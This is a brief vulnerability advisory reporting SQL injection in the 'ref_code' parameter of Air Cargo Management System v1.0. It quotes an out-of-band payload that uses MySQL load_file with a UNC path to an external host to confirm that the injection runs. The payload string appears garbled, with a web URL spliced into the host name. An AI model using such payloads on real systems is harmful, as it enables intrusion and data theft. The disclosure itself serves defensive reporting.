# Reference: https://github.com/nu11secur1ty/CVE-nu11secur1ty/blob/main/vendors/oretnom23/2022/Air-Cargo-Management-System

# Description:
The `ref_code` parameter from Air Cargo Management System v1.0 appears
to be vulnerable to SQL injection attacks.
The payload '+(select
load_file('\\\\c5idmpdvfkqycmiqwv299ljz1q7jvej5mtdg44t.https://www.sourcecodester.com/php/15188/air-cargo-management-system-php-oop-free-source-code.html\\hag'))+'
was submitted in the ref_code parameter.
This payload injects a SQL sub-query that calls MySQL's load_file
function with a UNC file path that references a URL on an external
domain.
The application interacted with that domain, indicating that the
injected SQL query was executed.
WARNING: If this is in some external domain, or some subdomain
redirection, or internal whatever, this will be extremely dangerous!
Status: CRITICAL
